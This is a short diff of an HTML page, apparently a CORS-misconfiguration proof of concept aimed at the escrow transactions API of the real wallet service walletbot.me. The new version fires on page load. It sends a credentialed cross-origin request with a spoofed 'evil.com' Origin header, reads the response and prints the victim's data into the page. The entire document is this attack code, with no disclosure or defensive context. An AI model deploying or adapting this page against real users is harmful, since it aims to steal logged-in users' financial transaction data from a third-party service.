@@ -1,36 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Test POST to WalletBot</title>
-</head>
-<body>
-  <h2>Try Sending POST to walletbot.me</h2>
-
-  <button onclick="sendData()">Send Request</button>
-
-  <script>
-    function sendData() {
-      const data = {
-        test: "test value"
-      };
-
-      fetch("https://walletbot.me/scwapi/escrow/transactions", {
-        method: "POST",
-        mode: "no-cors", // bypass CORS error, but can't read response
+  <body>
+    <script>
+      fetch("https://walletbot.me/scwapi/escrow/transactions/", {
         credentials: "include",
+        mode: "cors",
         headers: {
-          "Content-Type": "application/json"
-          // ⚠️ You CANNOT add Authorization here with no-cors
-        },
-        body: JSON.stringify(data)
+          "Origin": "https://evil.com"
+        }
       })
-      .then(res => {
-        console.log("Request sent (opaque response).");
+      .then(res => res.text())
+      .then(data => {
+        console.log("Fetched:", data);
+        document.write("<pre>" + data + "</pre>");
       })
-      .catch(err => {
-        console.error("Fetch error:", err);
-      });
-    }
-  </script>
-</body>
+      .catch(err => console.error("Fetch failed:", err));
+    </script>
+  </body>
 </html>
